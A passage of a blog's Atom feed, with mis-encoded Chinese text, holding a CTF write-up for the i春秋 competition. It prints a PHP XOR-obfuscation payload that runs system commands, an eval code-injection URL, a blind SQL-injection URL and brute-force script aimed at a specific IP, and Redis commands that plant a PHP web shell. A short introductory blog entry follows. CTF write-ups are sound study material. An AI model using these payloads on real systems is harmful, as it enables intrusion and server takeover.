    <id>/2019/09/16/iæ˜¥ç§‹CTFå¤ºæ——èµ›-ç¬¬ä¸€å­£/</id>
    <published>2019-09-16T11:08:30.000Z</published>
    <updated>2019-09-20T13:27:07.764Z</updated>
    <content type="html"><![CDATA[<h1><span id="iæ˜¥ç§‹ctfå¤ºæ——èµ›ç¬¬ä¸€å­£">iæ˜¥ç§‹CTFå¤ºæ——èµ›(ç¬¬ä¸€å­£)</span></h1><hr>
<h2><span id="web">WEB</span></h2><h3><span id="math">math</span></h3><p>2019å›½èµ›çº¿ä¸Šèµ›çš„åŠ å¼ºç‰ˆï¼Œbanæ‰äº†<code>base_convert</code>,<code>dechex</code>æ— æ³•é€šè¿‡è¿›åˆ¶è½¬æ¢é€ å‡ºæ¥å­—æ¯äº†<br><img src="/2019/09/16/iæ˜¥ç§‹CTFå¤ºæ——èµ›-ç¬¬ä¸€å­£/1.png" alt><br><code>mt_rand^23==&gt;_G</code>å’Œ<code>rand^75==&gt;ET</code>å¼‚æˆ–æ„é€ å‡ºæ¥<code>_G</code>å’Œ<code>ET</code><br><img src="/2019/09/16/iæ˜¥ç§‹CTFå¤ºæ——èµ›-ç¬¬ä¸€å­£/2.png" alt><br><img src="/2019/09/16/iæ˜¥ç§‹CTFå¤ºæ——èµ›-ç¬¬ä¸€å­£/3.png" alt><br>åˆ©ç”¨PHPçš„å¯å˜å˜é‡ä½¿å¾—<code>$pi=&quot;_GET&quot;</code>å˜ä¸º<code>$pi=&quot;$_GET</code><br>å†åˆ©ç”¨phpçš„<code>{}</code>å†…ä¹Ÿå¯æ‰§è¡Œ<br><img src="/2019/09/16/iæ˜¥ç§‹CTFå¤ºæ——èµ›-ç¬¬ä¸€å­£/4.png" alt><br><img src="/2019/09/16/iæ˜¥ç§‹CTFå¤ºæ——èµ›-ç¬¬ä¸€å­£/5.png" alt><br>å¼‚æˆ–è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    <span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">                $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">                <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=(is_nan^(6).(4)).(rand^(7).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=ls /</span><br></pre></td></tr></table></figure>

<h3><span id="easyphp">easyphp</span></h3><p>æºç æ³„éœ²index.php.bak<br><img src="/2019/09/16/iæ˜¥ç§‹CTFå¤ºæ——èµ›-ç¬¬ä¸€å­£/6.png" alt><br>ç›´æ¥æ„é€ é—­åˆ<code>&#39;);payload//</code><br>payload<code>http://url/?file=.%27)===eval($_POST[&quot;a&quot;]);//</code></p>
<h3><span id="crypto-rsa">crypto-rsa</span></h3><p>i æ˜¥ç§‹ç¯å¢ƒç‚¸è£‚</p>
<h3><span id="mysql">mysql</span></h3><p>i æ˜¥ç§‹ç¯å¢ƒç‚¸è£‚<br>å‰é¢SQLæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.106.94.18:13004/login.php?username=admin\&amp;passwd=||passwd/**/regexp/**/&quot;1&quot;;%00</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´å¯†ç è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">req = requests.Session()</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">code = string.ascii_letters + string.digits</span><br><span class="line"><span class="comment">#print(req.get(url).content.decode("utf-8"))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> code:</span><br><span class="line">        url = <span class="string">'http://39.106.94.18:13004/login.php?username=\&amp;passwd=||passwd/**/regexp/**/"^&#123;&#125;&#123;&#125;";%00'</span>.format(payload,j)</span><br><span class="line">        <span class="comment">#print(req.get(url).content.decode("utf-8"))</span></span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Welcome admin"</span><span class="keyword">in</span> req.get(url).content.decode(<span class="string">"utf-8"</span>):</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h3><span id="redis">redis</span></h3><p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /www</span><br><span class="line">config set dbfilename dkk.php</span><br><span class="line">set shell &quot;&lt;?php eval($_POST[&quot;pass&quot;]) ?&gt;&quot;</span><br><span class="line">è®¿é—®dkk.php</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="iæ˜¥ç§‹ctfå¤ºæ——èµ›ç¬¬ä¸€å­£">iæ˜¥ç§‹CTFå¤ºæ——èµ›(ç¬¬ä¸€å­£)</span></h1><hr>
<h2><span id="web">WEB</span></h2><h3><span id="math">math</span></h3><p>2019å›½èµ›çº¿ä¸Š]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[First Blog]]></title>
    <link href="/2019/09/16/First-Blog/"/>
    <id>/2019/09/16/First-Blog/</id>
    <published>2019-09-15T16:14:46.000Z</published>
    <updated>2019-09-16T13:29:15.216Z</updated>
    <content type="html"><![CDATA[<h1><span id="first-blog">First Blog</span></h1><hr>
<h2><span id="dkk">dkk</span></h2><p>CTFåœˆä¸­å¤§äºŒèœğŸ¶ä¸€æšï¼Œå¸ˆå‚…ä»¬ddddhm</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    phpinfo();//test</span><br></pre></td></tr></table></figure>

<p>åšå®¢ä½¿ç”¨hexoçš„Cactusä¸»é¢˜</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="first-blog">First Blog</span></h1><hr>
<h2><span id="dkk">dkk</span></h2><p>CTFåœˆä¸­å¤§äºŒèœğŸ¶ä¸€æšï¼Œå¸ˆå‚…ä»¬ddddhm</p>
<figure class="highligh]]>
    </summary>
    
  </entry>
  
</feed>